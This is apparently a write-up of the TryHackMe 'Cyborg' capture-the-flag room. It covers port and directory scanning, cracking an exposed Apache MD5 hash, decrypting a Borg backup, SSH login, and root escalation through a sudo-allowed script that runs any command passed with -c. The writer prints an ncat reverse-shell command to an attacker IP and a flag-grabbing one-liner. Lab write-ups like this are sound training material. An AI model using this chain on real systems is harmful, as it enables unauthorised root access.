![[cyborg_00.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_00.png)

This was a great room and an easy one to get you started with hash cracking.

---

We'll start out by running two `nmap` scans. Honestly, it's quicker with these easier machines.

![[cyborg_01.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_01.png)

The second is a scan to discover more about the services on the open ports we found in the first scan.

![[cyborg_02.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_02.png)

This is nice and simple. We have two open ports and not much else to discover here. We could run `nmap` scripts to probe the services and potentially find more stuff, however, that's not necessary in this case.

![[cyborg_03.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_03.png)

We'll find the default Apache page, let's dig a little deeper.

Doing a `gobuster` scan, we will find a directory called `admin`.

![[cyborg_04.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_04.png)

Let's check it out.

![[cyborg_05.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_05.png)

Apparently, Alex is cool.

If we click around we can find an `Admin Shoutbox` with something very interesting. Also, we'll confirm the owners name: `Alex`. 

![[cyborg_06.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_06.png)

The last entry mentions that the site's using a proxy but Alex is pretty sure they broke it. They're sure that there's nothing confidential laying around and also, that their `music_archive` is safe?

If we click around some more we'll see that we can download said archive.

![[cyborg_07.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_07.png)

From our scan above, we also found a directory called `/etc/`. That reminds me of `/etc/passwd` so, let's have a look before we go any further on this archive file. 

![[cyborg_08.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_08.png)

Another directory.

![[cyborg_09.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_09.png)

Also, some files! Right off the bat the `passwd` file is the most interesting to me.

![[cyborg_33.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_33.png)

The password is for the `music_archive` and is an `Apache MD5` hash (you can discover this with `hashcat --help | grep -i MD5` or just search the help (tool or online) for `apr1`).

![[cyborg_10.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_10.png)

The last file we found reads:

![[cyborg_11.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_11.png)

They are using a `squid` proxy with `basic auth` and the password we just found. We don't really have any way to interact with this, also, the password we found mentioned it was for Alex's `music_archive`. So let's see what we can do with the `archive.tar` file we downloaded.

First, we'll crack the password by copying the hash to a file called `hash` and running it through `john the ripper` against `rockyou.txt`.

![[cyborg_12.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_12.png)

Now, we have a password.

![[cyborg_13.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_13.png)

Looks like we didn't need a password, yet. Let's list out the files to see what we have.

![[cyborg_14.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_14.png)

Huh? Looks like some encrypted data. What is a `.5` file?

![[cyborg_15.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_15.png)

A `borg` backup? What is that?

Google to the rescue!

![[cyborg_16.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_16.png)

It's a backup utility. Nice. Seeing that we have the archive and we know the technology used. Let's see if we can get the Linux binary and then try decrypting the archive using the password we found.

We will first do a quick search on `apt`.

![[cyborg_17.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_17.png)

Yup, it do be there. We can simply grab it with: `sudo apt install borgbackup -y`.

Once installed, we can read the documentation to find out how to list and extract data.

If we check the `list` section we will find that we can list what the archive is and then, more specifically, list the archive itself by adding the archive name to the path with `::` (like using the scope resolution operator in `C++`).

![[cyborg_18.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_18.png)

We'll find that the archive is called "music_archive". Not a shock. That means we can now run `list` with `::music_archive` to output the contents of the archive.

![[cyborg_19.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_19.png)

It's the contents of Alex's home directory! So, now we know how we can find and access the archive. Extracting it should be straight-forward.

When checking the documentation, we will find an entry on the `extract` module with some examples.

![[cyborg_20.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_20.png)

To not conflict with the archive we've already extracted from the `tarball` (just in case) we'll create a new folder called `extracted`, move there and extract the data.

![[cyborg_21.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_21.png)

Once more we'll use the password we found.

Now, we'll list the contents with `tree -a home`. Looking through the output we'll find two interesting files that stand out right away.

![[cyborg_22.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_22.png)

Let's check them.

![[cyborg_23.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_23.png)

A nice little message AND a password. It's Christmas!

Now we have a password for Alex. Let's try to `ssh` to the machine.

![[cyborg_24.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_24.png)

*Hacker Voice: We're in.*

Now for escalating our privileges. The tried and true `sudo -l` gets us something.

![[cyborg_25.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_25.png)

Now this is interesting! We can run a file called `backup.sh` with `NOPASSWD` as `ALL`. Meaning that it will be run as root when we use it with `sudo`.

Let's check it out to see what it says.

![[cyborg_26.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_26.png)

What we can see is that it grabs file names that end in `.mp3` and adds them to a file. However, it doesn't seem to do anything with the file. It hard-codes the names of files it DOES use as well as the destination and creates an archive with `tar`. With `tar` if you can manipulate the command in anyway (typically where a wildcard is concerned) you can add some checkpoints to run a shell. That isn't the case here.

The most interesting parts are the loop at the top and the line second to the last. Putting these together we can see a loop and the line `cmd=$($command)`. I'll clean up the code to show what's so interesting.

![[cyborg_27.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_27.png)

The file is using `getopts` which is a way in `bash` to pass command line arguments. Here the "flag" or "switch" is the letter `c`. That is, it'll be specified as `-c`. Now, when the switch is specified the argument is passed as the variable `OPTARG`. So, `-c` is the switch and, say, `ls -lah` is what is held by `OPTARG`. Then below that we can see that this command is set to `cmd` which subsequently gets executed.

A note on `$()` vs `${}`. These are two forms of command substitution. More specifically, `$()` means to evaluate the command and set the result to `stdout` or a variable, in this case it'll be a variable. `${}` simply means to expand a variable, that means in the example I just mentioned, `OPTARG` will be replaced with `ls -lah`.

Then when `cmd` gets set to `$($command)`, `$command` gets evaluated first. Meaning, we'd run `ls -lah` on the system and `cmd` would contain the result. 

Let's try it by using the script with the switch we just discovered. 

![[cyborg_28.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_28.png)

Nice! That means we could grab a reverse shell, no? 

Well, one moment. It depends what type of payload we use. If we wanted to send a simple `bash` reverse `TCP` shell using the `/dev/tcp` devices we'd fail because the redirection involved will cause the shell to error out. Let's not try to do anything too complicated as we're trying to spawn this shell through a script's command argument. 

First, let's see if `ncat` is on the machine.

![[cyborg_29.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_29.png)

Good. We can easily send ourselves a shell with `ncat` using the `-e` flag. Hopefully the addition of this extra flag in the call doesn't cause an issue when being parsed.

Before sending the shell we'll set up a listener with `rlwrap nc -nlvp 4142`.

Now, we'll run a reverse shell to our connection using: `/usr/bin/ncat OUR_IP OUR_PORT -e /bin/bash` as the command to the script. This should result in us getting a shell as the `root` user.

![[cyborg_30.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_30.png)

Let's fix our shell a little by using python and the `pty` module.

![[cyborg_31.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_31.png)

This will give us a full readout rather than our minimal version we spawned into. We can always improve the shell further through other methods, including adding persistence but we're good to go here.

Now we can grab the flags.

We can do this in a nice one-liner.

![[cyborg_32.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Cyborg/images/cyborg_32.png)

If you want to easily copy and paste the command I used, it is:

```bash
#Flag Get
echo -n "user: " && cat $(find / -name user.txt 2>/dev/null) && echo -n "root: " && cat $(find / -name root.txt 2>/dev/null)
```

I loved this room because the `PrivEsc` vector was a lot of fun to play around with. Reading source code for ways to exploit it is always interesting to me.

GG!
